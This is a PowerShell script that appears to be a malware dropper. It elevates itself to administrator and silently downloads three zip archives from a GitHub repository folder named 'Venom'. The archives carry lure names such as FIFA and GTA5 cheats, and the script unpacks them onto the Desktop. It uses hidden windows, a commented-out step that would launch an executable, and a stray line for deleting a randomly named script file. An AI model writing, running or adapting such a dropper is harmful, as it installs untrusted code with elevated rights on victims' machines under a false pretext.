
$zipUrl = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip"
$zipFilePath = "$env:TEMP\AssassinsCreed_SE.zip"
$zipUrl_1 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Fifa-2025-Cheats.zip"
$zipFilePath_1 = "$env:TEMP\Fifa-2025-Cheats.zip"
$zipUrl_2 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Gta5-Cheats-Ps5.zip"
$zipFilePath_2 = "$env:TEMP\Gta5-Cheats-Ps5.zip"
$desktopPath = [System.Environment]::GetFolderPath("Desktop")

function Test-IsAdmin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-IsAdmin)) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    Exit
}

powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath

powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_1 -OutFile $zipFilePath_1

powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_2 -OutFile $zipFilePath_2

Expand-Archive -Path $zipFilePath -DestinationPath $desktopPath -Force

Expand-Archive -Path $zipFilePath_1 -DestinationPath $desktopPath -Force

Expand-Archive -Path $zipFilePath_2 -DestinationPath $desktopPath -Force

Start-Sleep -Seconds 240

#Start-Process -FilePath "$desktopPath\AssassinsCreed_SE.exe" 

exit 0

Remove-Item -Path "%%d:\wYytnosVxfzD.ps1"
